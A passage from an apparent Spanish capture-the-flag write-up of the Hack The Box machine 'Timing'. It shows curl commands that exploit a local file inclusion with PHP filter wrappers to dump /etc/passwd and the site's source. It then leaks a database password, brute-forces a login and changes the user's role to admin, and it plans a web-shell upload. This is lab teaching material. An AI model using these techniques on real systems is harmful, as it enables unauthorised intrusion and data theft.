________________________________________________ img [Status: 200, Size: 25, Words: 3, Lines: 1] [WARN] Caught keyboard interrupt (Ctrl-C) Al solicitar /etc/passwd nos muestra un mensaje que indica que existe algun tipo de filtro.\n1 2 3 π ~/htb/timing ❯ curl -s \u0026#34;http://10.10.11.135/./login.php/../image.php?img=/etc/passwd\u0026#34; Hacking attempt detected! π ~/htb/timing ❯ Si pasamos el archivo login.php parece ser ejecutado, ya que no se muestra el codigo fuente PHP.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 π ~/htb/timing ❯ curl -s \u0026#34;http://10.10.11.135/./login.php/../image.php?img=login.php\u0026#34;|head -n 15 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Simple WebApp\u0026lt;/title\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;./css/bootstrap.min.css\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;./js/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;./js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; html, body { margin: 0; padding: 0; (23) Failed writing body π ~/htb/timing ❯ Utilizando wrappers de PHP logramos obtener en base64 el archivo /etc/passwd, vemos en este al usuario aaron.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 π ~/htb/timing ❯ curl -s \u0026#34;http://10.10.11.135/./login.php/../image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd\u0026#34; |base64 -d root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false aaron:x:1000:1000:aaron:/home/aaron:/bin/bash π ~/htb/timing ❯ Codigo Fuente Utilizando el wrapper anterior logramos obtener el codigo fuente de todas las paginas conocidas y paginas nuevas que descubrimos en el codigo. Login utiliza role e userid para generar una sesion del usuario.\nlogin.php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 \u0026lt;?php include \u0026#34;header.php\u0026#34;; function createTimeChannel() { sleep(1); } include \u0026#34;db_conn.php\u0026#34;; if (isset($_SESSION[\u0026#39;userid\u0026#39;])){ header(\u0026#39;Location: ./index.php\u0026#39;); die(); } if (isset($_GET[\u0026#39;login\u0026#39;])) { $username = $_POST[\u0026#39;user\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; $statement = $pdo-\u0026gt;prepare(\u0026#34;SELECT * FROM users WHERE username = :username\u0026#34;); $result = $statement-\u0026gt;execute(array(\u0026#39;username\u0026#39; =\u0026gt; $username)); $user = $statement-\u0026gt;fetch(); if ($user !== false) { createTimeChannel(); if (password_verify($password, $user[\u0026#39;password\u0026#39;])) { $_SESSION[\u0026#39;userid\u0026#39;] = $user[\u0026#39;id\u0026#39;]; $_SESSION[\u0026#39;role\u0026#39;] = $user[\u0026#39;role\u0026#39;]; header(\u0026#39;Location: ./index.php\u0026#39;); return; } } $errorMessage = \u0026#34;Invalid username or password entered\u0026#34;; } ?\u0026gt; \u0026lt;?php if (isset($errorMessage)) { ?\u0026gt; \u0026lt;div class=\u0026#34;container-fluid\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-md-10 col-md-offset-1\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;alert alert-danger alert-dismissible fade in text-center\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt;\u0026lt;strong\u0026gt; \u0026lt;?php echo $errorMessage; ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php } ?\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;./css/login.css\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;wrapper fadeInDown\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;formContent\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;fadeIn first\u0026#34; style=\u0026#34;padding: 20px\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;./images/user-icon.png\u0026#34; width=\u0026#34;100\u0026#34; height=\u0026#34;100\u0026#34;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;form action=\u0026#34;?login=true\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;login\u0026#34; class=\u0026#34;fadeIn second\u0026#34; name=\u0026#34;user\u0026#34; placeholder=\u0026#34;login\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;password\u0026#34; class=\u0026#34;fadeIn third\u0026#34; name=\u0026#34;password\u0026#34; placeholder=\u0026#34;password\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; class=\u0026#34;fadeIn fourth\u0026#34; value=\u0026#34;Log In\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;!-- todo --\u0026gt; \u0026lt;div id=\u0026#34;formFooter\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;underlineHover\u0026#34; href=\u0026#34;#\u0026#34;\u0026gt;Forgot Password?\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php include \u0026#34;footer.php\u0026#34;; En el header encontramos nuevas paginas y direcciones como Admin Panel.\nheader.php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 \u0026lt;?php include \u0026#34;auth_check.php\u0026#34;; ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Simple WebApp\u0026lt;/title\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;./css/bootstrap.min.css\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;./js/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;./js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; html, body { margin: 0; padding: 0; max-width: 100%; overflow-x: hidden; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;nav class=\u0026#34;navbar navbar-default\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container-fluid\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;navbar-header\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;navbar-brand\u0026#34; href=\u0026#34;#\u0026#34;\u0026gt;Simple WebApp\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;ul class=\u0026#34;nav navbar-nav\u0026#34;\u0026gt; \u0026lt;?php if (isset($_SESSION[\u0026#39;userid\u0026#39;])) { ?\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;index.php\u0026#34;\u0026gt;Home\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;profile.php\u0026#34;\u0026gt;Edit profile\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;?php if (isset($_SESSION[\u0026#39;role\u0026#39;]) \u0026amp;\u0026amp; $_SESSION[\u0026#39;role\u0026#39;] == 1) { ?\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;avatar_uploader.php\u0026#34;\u0026gt;Admin panel\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;?php } ?\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;ul class=\u0026#34;nav navbar-nav navbar-right\u0026#34;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;logout.php\u0026#34;\u0026gt;Logout\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;?php } else { ?\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;login.php\u0026#34;\u0026gt;Login\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;?php } ?\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; En profile se puede realizar cambios a la informacion \u0026ldquo;personal\u0026rdquo; del usuario enviadas a traves de un formulario a profile_update.php.\nprofile.php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 \u0026lt;?php include_once \u0026#34;header.php\u0026#34;; include_once \u0026#34;db_conn.php\u0026#34;; $id = $_SESSION[\u0026#39;userid\u0026#39;]; // fetch updated user $statement = $pdo-\u0026gt;prepare(\u0026#34;SELECT * FROM users WHERE id = :id\u0026#34;); $result = $statement-\u0026gt;execute(array(\u0026#39;id\u0026#39; =\u0026gt; $id)); $user = $statement-\u0026gt;fetch(); ?\u0026gt; \u0026lt;script src=\u0026#34;js/profile.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;div class=\u0026#34;container bootstrap snippets bootdey\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;alert alert-success\u0026#34; id=\u0026#34;alert-profile-update\u0026#34; style=\u0026#34;display: none\u0026#34;\u0026gt; \u0026lt;strong\u0026gt;Success!\u0026lt;/strong\u0026gt; Profile was updated. \u0026lt;/div\u0026gt; \u0026lt;h1 class=\u0026#34;text-primary\u0026#34;\u0026gt;\u0026lt;span class=\u0026#34;glyphicon glyphicon-user\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;Edit Profile\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;!-- left column --\u0026gt; \u0026lt;div class=\u0026#34;col-md-1\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- edit form column --\u0026gt; \u0026lt;div class=\u0026#34;col-md-9 personal-info\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Personal info\u0026lt;/h3\u0026gt; \u0026lt;form class=\u0026#34;form-horizontal\u0026#34; role=\u0026#34;form\u0026#34; id=\u0026#34;editForm\u0026#34; action=\u0026#34;#\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label class=\u0026#34;col-lg-3 control-label\u0026#34;\u0026gt;First name:\u0026lt;/label\u0026gt; \u0026lt;div class=\u0026#34;col-lg-8\u0026#34;\u0026gt; \u0026lt;input class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;firstName\u0026#34; id=\u0026#34;firstName\u0026#34; value=\u0026#34;\u0026lt;?php if (!empty($user[\u0026#39;firstName\u0026#39;])) echo $user[\u0026#39;firstName\u0026#39;]; ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label class=\u0026#34;col-lg-3 control-label\u0026#34;\u0026gt;Last name:\u0026lt;/label\u0026gt; \u0026lt;div class=\u0026#34;col-lg-8\u0026#34;\u0026gt; \u0026lt;input class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;lastName\u0026#34; id=\u0026#34;lastName\u0026#34; value=\u0026#34;\u0026lt;?php if (!empty($user[\u0026#39;lastName\u0026#39;])) echo $user[\u0026#39;lastName\u0026#39;]; ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label class=\u0026#34;col-lg-3 control-label\u0026#34;\u0026gt;Company:\u0026lt;/label\u0026gt; \u0026lt;div class=\u0026#34;col-lg-8\u0026#34;\u0026gt; \u0026lt;input class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;company\u0026#34; id=\u0026#34;company\u0026#34; value=\u0026#34;\u0026lt;?php if (!empty($user[\u0026#39;company\u0026#39;])) echo $user[\u0026#39;company\u0026#39;]; ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label class=\u0026#34;col-lg-3 control-label\u0026#34;\u0026gt;Email:\u0026lt;/label\u0026gt; \u0026lt;div class=\u0026#34;col-lg-8\u0026#34;\u0026gt; \u0026lt;input class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;email\u0026#34; id=\u0026#34;email\u0026#34; value=\u0026#34;\u0026lt;?php if (!empty($user[\u0026#39;email\u0026#39;])) echo $user[\u0026#39;email\u0026#39;]; ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-md-9 bg-light text-right\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; onclick=\u0026#34;updateProfile()\u0026#34; class=\u0026#34;btn btn-primary\u0026#34;\u0026gt; Update \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;?php include_once \u0026#34;footer.php\u0026#34;; ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 function updateProfile() { var xml = new XMLHttpRequest(); xml.onreadystatechange = function () { if (xml.readyState == 4 \u0026amp;\u0026amp; xml.status == 200) { document.getElementById(\u0026#34;alert-profile-update\u0026#34;).style.display = \u0026#34;block\u0026#34; } }; xml.open(\u0026#34;POST\u0026#34;, \u0026#34;profile_update.php\u0026#34;, true); xml.setRequestHeader(\u0026#34;Content-type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); xml.send(\u0026#34;firstName=\u0026#34; + document.getElementById(\u0026#34;firstName\u0026#34;).value + \u0026#34;\u0026amp;lastName=\u0026#34; + document.getElementById(\u0026#34;lastName\u0026#34;).value + \u0026#34;\u0026amp;email=\u0026#34; + document.getElementById(\u0026#34;email\u0026#34;).value + \u0026#34;\u0026amp;company=\u0026#34; + document.getElementById(\u0026#34;company\u0026#34;).value); } Estan prohibidos ciertos Wrappers, protocolos y caracteres en image.php.\nimage.php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php function is_safe_include($text) { $blacklist = array(\u0026#34;php://input\u0026#34;, \u0026#34;phar://\u0026#34;, \u0026#34;zip://\u0026#34;, \u0026#34;ftp://\u0026#34;, \u0026#34;file://\u0026#34;, \u0026#34;http://\u0026#34;, \u0026#34;data://\u0026#34;, \u0026#34;expect://\u0026#34;, \u0026#34;https://\u0026#34;, \u0026#34;../\u0026#34;); foreach ($blacklist as $item) { if (strpos($text, $item) !== false) { return false; } } return substr($text, 0, 1) !== \u0026#34;/\u0026#34;; } if (isset($_GET[\u0026#39;img\u0026#39;])) { if (is_safe_include($_GET[\u0026#39;img\u0026#39;])) { include($_GET[\u0026#39;img\u0026#39;]); } else { echo \u0026#34;Hacking attempt detected!\u0026#34;; } } Vemos el codigo de avatar_uploader.php que realiza el cambio de imagen de los usuario enviando esta a upload.php.\navatar_uploader.php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 \u0026lt;?php include_once \u0026#34;header.php\u0026#34;; include_once \u0026#34;admin_auth_check.php\u0026#34;; ?\u0026gt; \u0026lt;script src=\u0026#34;js/avatar_uploader.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; .bg { padding: 30px; /* Full height */ height: 100%; /* Center and scale the image nicely */ background-position: center; background-repeat: no-repeat; background-size: cover; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026#34;bg\u0026#34; id=\u0026#34;main\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;alert alert-success\u0026#34; id=\u0026#34;alert-uploaded-success\u0026#34; style=\u0026#34;display: none\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;alert alert-danger\u0026#34; id=\u0026#34;alert-uploaded-error\u0026#34; style=\u0026#34;display: none\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;container bootstrap snippets bootdey\u0026#34; style=\u0026#34;margin-bottom: 150px\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-primary\u0026#34;\u0026gt;\u0026lt;span class=\u0026#34;glyphicon glyphicon-user\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;Upload avatar\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;form class=\u0026#34;form-inline\u0026#34; action=\u0026#34;upload.php\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-group mb-2\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;fileToUpload\u0026#34; class=\u0026#34;form-control\u0026#34; id=\u0026#34;fileToUpload\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; onclick=\u0026#34;doUpload()\u0026#34; class=\u0026#34;btn btn-primary\u0026#34;\u0026gt; Upload Image \u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php include_once \u0026#34;footer.php\u0026#34;; ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 $(document).ready(function () { document.getElementById(\u0026#34;main\u0026#34;).style.backgroundImage = \u0026#34;url(\u0026#39;/image.php?img=images/background.jpg\u0026#39;\u0026#34; }); function doUpload() { if (document.getElementById(\u0026#34;fileToUpload\u0026#34;).files.length == 0) { document.getElementById(\u0026#34;alert-uploaded-error\u0026#34;).style.display = \u0026#34;block\u0026#34; document.getElementById(\u0026#34;alert-uploaded-success\u0026#34;).style.display = \u0026#34;none\u0026#34; document.getElementById(\u0026#34;alert-uploaded-error\u0026#34;).textContent = \u0026#34;No file selected!\u0026#34; } else { let file = document.getElementById(\u0026#34;fileToUpload\u0026#34;).files[0]; // file from input let xmlHttpRequest = new XMLHttpRequest(); xmlHttpRequest.onreadystatechange = function () { if (xmlHttpRequest.readyState == 4 \u0026amp;\u0026amp; xmlHttpRequest.status == 200) { if (xmlHttpRequest.responseText.includes(\u0026#34;Error:\u0026#34;)) { document.getElementById(\u0026#34;alert-uploaded-error\u0026#34;).style.display = \u0026#34;block\u0026#34; document.getElementById(\u0026#34;alert-uploaded-success\u0026#34;).style.display = \u0026#34;none\u0026#34; document.getElementById(\u0026#34;alert-uploaded-error\u0026#34;).textContent = xmlHttpRequest.responseText; } else { document.getElementById(\u0026#34;alert-uploaded-error\u0026#34;).style.display = \u0026#34;none\u0026#34; document.getElementById(\u0026#34;alert-uploaded-success\u0026#34;).textContent = xmlHttpRequest.responseText; document.getElementById(\u0026#34;alert-uploaded-success\u0026#34;).style.display = \u0026#34;block\u0026#34; } } }; let formData = new FormData(); formData.append(\u0026#34;fileToUpload\u0026#34;, file); xmlHttpRequest.open(\u0026#34;POST\u0026#34;, \u0026#39;upload.php\u0026#39;); xmlHttpRequest.send(formData); } } En upload vemos que acepta archivos, creando un nombre único apartir de un hash MD5 tomando en cuenta el tiempo actual (de la maquina) y nombre del archivo. Aunque para acceder a esta pagina es necesario tener permisos de administrador.\nupload.php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 \u0026lt;?php include(\u0026#34;admin_auth_check.php\u0026#34;); $upload_dir = \u0026#34;images/uploads/\u0026#34;; if (!file_exists($upload_dir)) { mkdir($upload_dir, 0777, true); } $file_hash = uniqid(); $file_name = md5(\u0026#39;$file_hash\u0026#39; . time()) . \u0026#39;_\u0026#39; . basename($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;]); $target_file = $upload_dir . $file_name; $error = \u0026#34;\u0026#34;; $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION)); if (isset($_POST[\u0026#34;submit\u0026#34;])) { $check = getimagesize($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;tmp_name\u0026#34;]); if ($check === false) { $error = \u0026#34;Invalid file\u0026#34;; } } // Check if file already exists if (file_exists($target_file)) { $error = \u0026#34;Sorry, file already exists.\u0026#34;; } if ($imageFileType != \u0026#34;jpg\u0026#34;) { $error = \u0026#34;This extension is not allowed.\u0026#34;; } if (empty($error)) { if (move_uploaded_file($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;tmp_name\u0026#34;], $target_file)) { echo \u0026#34;The file has been uploaded.\u0026#34;; } else { echo \u0026#34;Error: There was an error uploading your file.\u0026#34;; } } else { echo \u0026#34;Error: \u0026#34; . $error; } ?\u0026gt; Finalmente encontramos la conexion de la base de datos MySQL, credenciales de acceso y codigo util para verificar el acceso de usuarios.\nUtils\r1 2 \u0026lt;?php $pdo = new PDO(\u0026#39;mysql:host=localhost;dbname=app\u0026#39;, \u0026#39;root\u0026#39;, \u0026#39;4_V3Ry_l0000n9_p422w0rd\u0026#39;); 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php include_once \u0026#34;auth_check.php\u0026#34;; if (!isset($_SESSION[\u0026#39;role\u0026#39;]) || $_SESSION[\u0026#39;role\u0026#39;] != 1) { echo \u0026#34;No permission to access this panel!\u0026#34;; header(\u0026#39;Location: ./index.php\u0026#39;); die(); } ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;?php //ini_set(\u0026#39;display_errors\u0026#39;, \u0026#39;1\u0026#39;); //ini_set(\u0026#39;display_startup_errors\u0026#39;, \u0026#39;1\u0026#39;); //error_reporting(E_ALL); // session is valid for 1 hour ini_set(\u0026#39;session.gc_maxlifetime\u0026#39;, 3600); session_set_cookie_params(3600); session_start(); if (!isset($_SESSION[\u0026#39;userid\u0026#39;]) \u0026amp;\u0026amp; strpos($_SERVER[\u0026#39;REQUEST_URI\u0026#39;], \u0026#34;login.php\u0026#34;) === false) { header(\u0026#39;Location: ./login.php\u0026#39;); die(); } ?\u0026gt; Aaron \u0026gt; Admin Observamos anteriormente que es posible subir archivos aunque es necesario obtener acceso como administrador, sin embargo, hasta este punto tenemos un pequeño numero de usuarios y contraseña. Utilizamos este pequeño wordlist para realizar \u0026lsquo;brute forcing\u0026rsquo; al login.\n1 2 3 4 root 4_V3Ry_l0000n9_p422w0rd user aaron Tras realizar esto encontramos que aaron:aaron es una combinación válida.\nEn \u0026lsquo;Edit profile\u0026rsquo; logramos realizar cambios a los datos que se muestran en el formulario.\nSi bien se realizan estos cambios, descubrimos que existen algunos datos que no se muestran en el formulario y que podrian ser actualizados.\nIntentamos realizar un cambio a \u0026lsquo;role\u0026rsquo; con valor 1 tomando en cuenta que este valor pertenece a admin o un rol superior, se muestra en la respuesta que se actualizó.\nCon este pequeño cambio logramos acceder a \u0026lsquo;Admin panel\u0026rsquo;.\nUpload En \u0026lsquo;Admin panel\u0026rsquo; logramos enviar una imagen JPG, pero no muestra el directorio en el que se encuentra ni el nombre.\nSi regresamos al codigo fuente observamos, que, el directorio donde se almacenan las imagenes es: images/uploads/.\n1 2 3 4 5 6 7 8 9 \u0026lt;?php [...] $upload_dir = \u0026#34;images/uploads/\u0026#34;; if (!file_exists($upload_dir)) { mkdir($upload_dir, 0777, true); } El nombre del archivo es MD5 y se créa a partir de un ID único, hora actual y el nombre del archivo.\n1 2 3 4 5 6 7 \u0026lt;?php [...] $file_hash = uniqid(); $file_name = md5(\u0026#39;$file_hash\u0026#39; . time()) . \u0026#39;_\u0026#39; . basename($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;]); $target_file = $upload_dir . $file_name; Verifíca que sea una imagen y su extensión sea jpg (\u0026ldquo;filtro\u0026rdquo;), que el archivo no exista, finalmente mueve el archivo a images/uploads/.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?php [...] $error = \u0026#34;\u0026#34;; $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION)); if (isset($_POST[\u0026#34;submit\u0026#34;])) { $check = getimagesize($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;tmp_name\u0026#34;]); if ($check === false) { $error = \u0026#34;Invalid file\u0026#34;; } } // Check if file already exists if (file_exists($target_file)) { $error = \u0026#34;Sorry, file already exists.\u0026#34;; } if ($imageFileType != \u0026#34;jpg\u0026#34;) { $error = \u0026#34;This extension is not allowed.\u0026#34;; } if (empty($error)) { if (move_uploaded_file($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;tmp_name\u0026#34;], $target_file)) { echo \u0026#34;The file has been uploaded.\u0026#34;; } else { echo \u0026#34;Error: There was an error uploading your file.\u0026#34;; } } else { echo \u0026#34;Error: \u0026#34; . $error; } ?\u0026gt; Web-Shell Timing Si logramos encontrar el nombre del archivo y realizar un \u0026ldquo;bypass\u0026rdquo; al \u0026ldquo;filtro\u0026rdquo;, quizas podríamos subir una webshell o ejecutar una shell inversa. Para ello necesitamos obtener la hora exacta de la maquina, sin embargo se muestra el puerto ntp cerrado.\n1 2 3 4 5 6 7 8 9 10 π ~/htb/timing ❯ sudo nmap -sU -p123 10.10.11.135 Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-26 22:33 UTC Nmap scan report for 10.10.11.135 (10.10.11.135) Host is up (0.063s latency). PORT STATE SERVICE 123/udp closed ntp Nmap done: 1 IP address (1 host up) scanned in 0.33 seconds π ~/htb/timing ❯ Si realizamos una solicitud al sitio web, vemos que en los headers se muestra la hora exacta de la maquina.\n1 2 3 4 5 π ~/htb/timing ❯ curl -sI http://10.10.11.135 |grep Date 